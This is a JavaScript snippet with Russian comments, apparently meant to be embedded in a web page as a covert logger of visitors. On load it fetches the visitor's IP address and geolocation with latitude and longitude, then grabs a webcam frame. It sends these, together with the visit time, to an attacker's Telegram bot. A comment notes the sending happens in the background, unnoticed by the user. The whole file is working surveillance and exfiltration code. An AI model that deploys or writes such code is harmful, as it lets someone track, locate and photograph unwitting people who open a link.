(async function() {
    "use strict";

    // ---------- 1. Сбор IP + геолокация ----------
    let ipAddress = "0.0.0.0";
    let geo = "не определена";

    try {
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipRes.json();
        ipAddress = ipData.ip;

        const geoRes = await fetch(`https://ipapi.co/${ipAddress}/json/`);
        const geoData = await geoRes.json();
        geo = `${geoData.city}, ${geoData.region}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
    } catch(e) {
        geo = "Недоступно";
    }

    // ---------- 2. Скрин с вебкамеры ----------
    let screenshotBase64 = "";
    let cameraStatus = "Заблокирована";

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        video.autoplay = true;
        
        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                video.play();
                resolve();
            };
        });

        // Ждём 0.5 сек для стабилизации кадра
        await new Promise(r => setTimeout(r, 500));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        screenshotBase64 = canvas.toDataURL("image/jpeg", 0.85).split(",")[1];
        cameraStatus = "Внизу";

        // Выключение камеры
        stream.getTracks().forEach(track => track.stop());
    } catch(e) {
        cameraStatus = "ошибка: " + e.message;
        screenshotBase64 = "";
    }

    // ---------- 3. Время перехода ----------
    const now = new Date();
    const timeStr = now.toLocaleString("ru-RU", { timeZone: "Europe/Moscow" }) + " MSK";

    // ---------- 4. Формирование сообщения ----------
    const messageText = `Новый переход!
Вебкамера: ${cameraStatus}
IP адрес: ${ipAddress}
Геолокация: ${geo}
Время перехода: ${timeStr}`;

    // ---------- 5. Отправка в Telegram ----------
    async function sendToTelegram() {
        // 5.1 Текстовое сообщение
        const textUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(textUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: messageText,
                parse_mode: "HTML"
            })
        });

        // 5.2 Фото с камеры (если есть)
        if (screenshotBase64 && screenshotBase64.length > 100) {
            const photoUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append("chat_id", TELEGRAM_CHAT_ID);
            formData.append("photo", dataURItoBlob(`data:image/jpeg;base64,${screenshotBase64}`), "webcam.jpg");
            await fetch(photoUrl, { method: "POST", body: formData });
        }
    }

    function dataURItoBlob(dataURI) {
        const byteString = atob(dataURI.split(",")[1]);
        const mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
        const ab = new ArrayBuffer(byteString.length);
        const ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

    // Фоновая отправка — без задержки для пользователя
    sendToTelegram().catch(console.error);
})();
